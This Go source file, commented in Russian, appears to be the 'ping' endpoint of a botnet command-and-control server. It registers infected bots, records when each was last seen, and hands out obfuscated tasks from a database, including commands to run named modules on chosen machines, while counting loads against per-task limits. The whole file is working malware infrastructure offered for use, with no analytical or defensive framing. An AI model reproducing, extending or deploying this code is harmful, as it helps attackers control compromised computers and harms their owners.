package ping

import (
	"fmt"
	"log"
	"net/http"
	"strings"

	database "../../../db"
	structures "../../../structures"
	utils "../../../utils"
	obf "../obf"

	"github.com/gin-gonic/gin"
)

var db = database.Connect()

/*
	Функция возвращает TRUE, если бот с этим uid уже существует в бд
*/
func IsBotExist(uid string) (isExist bool) {
	err := db.Get(&isExist, "SELECT COUNT(*) AS exist FROM `bots` WHERE `Uid` = ?", uid)
	if err != nil {
		log.Println("ping.IsBotExist:", err)
	}

	return
}

/*
	Функция возвращает айди последнего выполненного ботом задания
*/
func GetBotLastTask(uid string) (lastTask int) {
	err := db.Get(&lastTask, "SELECT `TaskId` FROM `bots` WHERE `Uid` = ?", uid)
	if err != nil {
		log.Println("ping.GetBotLastTask:", err)
	}

	return
}

/*
	Функция достёт из БД доступное для выполнения задания для конкретного бота.
	Если доступных заданий нет - возвращается пустая строка
*/
func GetCommand(uid string) (command string) {
	var taskData structures.TaskData

	/* достаём из бд заданиe, где:
	- Лимит запусков не привышен
	- Задание включено
	- Айди меньше айди последного выполненного задания ботом
	*/
	err := db.Get(&taskData, "SELECT * FROM `tasks` WHERE (`Runs` <= `Limit`) AND (`IsEnabled` = '1') AND (`Id` > ?) ORDER BY `Id` ASC LIMIT 1", GetBotLastTask(uid))
	if err != nil {
		log.Println("ping.GetCommand:", err)
		return ""
	}

	// если задание для конкретных ботов
	if taskData.Uids != "" {
		// проверяем, есть ли текущий бот в списке
		if !strings.Contains(taskData.Uids, uid) {
			// выходим, если нет
			return ""
		}
	}

	// инкрементируем счётчик лоадов
	_, err = db.Exec("UPDATE `tasks` SET `Loads` = `Loads` + 1 WHERE `Id` = ?", taskData.Id)
	if err != nil {
		log.Println("complete.TaskComplete:", err)
	}

	// если задание на запуск модуля - высылаем так же название модуля
	if taskData.Type == "run_module" {
		command = obf.Encrypt(fmt.Sprintf("task|%d|%s|%s|%s|", taskData.Id, taskData.Type, taskData.ModuleName, taskData.Param))
	} else {
		command = obf.Encrypt(fmt.Sprintf("task|%d|%s|%s|", taskData.Id, taskData.Type, taskData.Param))
	}
	return
}

/*
	Функция выдаёт команды боту.
	Если бот не зарегистрирован в БД, отправляет на регистрацию
*/
func SendCommand(ctx *gin.Context) {
	data_enc := ctx.PostForm("data")
	data := strings.Split(obf.Decrypt(data_enc), "|")
	if len(data) < 2 {
		ctx.String(http.StatusOK, obf.Encrypt("ping|"))
		return
	}

	uid := data[0] // вытаскиваем uid бота

	// проверяем, зарегистрирован ли бот
	if !IsBotExist(uid) {
		// не зарегистрирован, отправляем на регистрацию
		ctx.String(http.StatusOK, obf.Encrypt("reg|"))
		return
	}

	// обновляем последний онлайн бота
	_, err := db.Exec("UPDATE `bots` SET `Seen` = ? WHERE `Uid` = ?", utils.GetTimeStamp(), uid)
	if err != nil {
		log.Println("complete.TaskComplete:", err)
	}

	ctx.String(http.StatusOK, GetCommand(uid))
}
